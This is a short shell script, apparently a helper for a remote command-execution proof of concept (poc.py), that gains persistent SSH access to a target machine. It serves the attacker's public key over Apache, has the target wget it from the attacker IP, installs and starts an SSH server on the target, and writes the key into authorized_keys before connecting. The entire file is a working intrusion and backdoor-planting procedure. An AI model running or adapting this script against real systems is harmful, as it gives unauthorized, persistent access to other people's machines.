#!/usr/bin/env sh
# add the ssh key of attacker into target's authorized_keys to enable ssh link without key
# TODO: only executed this commands line by line manually, should test whether we can directly run ./get_shell.sh to run it.

if [ $# != 2 ] ; then
    echo "USAGE: $0 <target-ip> <attacker-ip>"
    echo "EXAMPLE: $0 192.168.101.3 192.168.101.4"
    exit 1;
fi

TARGET_IP=$1
ATTACK_IP=$2

# transfer public key to target machine
apt-get install apache2
service apache2 start
cp ~/.ssh/id_rsa.pub /var/www/html/key.txt
python3 poc.py $TARGET_IP 10911 wget http://$ATTACK_IP:80/key.txt 
service apache2 stop

# start the ssh service of target machine
# the command is executed by a 30s cron job, therefore, we should wait for the previous job to be completed
sleep 40
python3 poc.py $TARGET_IP 10911 apt-get install -y openssh-server
sleep 100
python3 poc.py $TARGET_IP 10911 service ssh start
sleep 40
python3 poc.py $TARGET_IP 10911 mkdir ~/.ssh
sleep 40
# NOTE: There are various ways to achieve this. Some may filter the "~"character and should find the absolute root to it
python3 poc.py $TARGET_IP 10911 cp key.txt ~/.ssh/authorized_keys

# access to target shell successfully
ssh $TARGET_IP
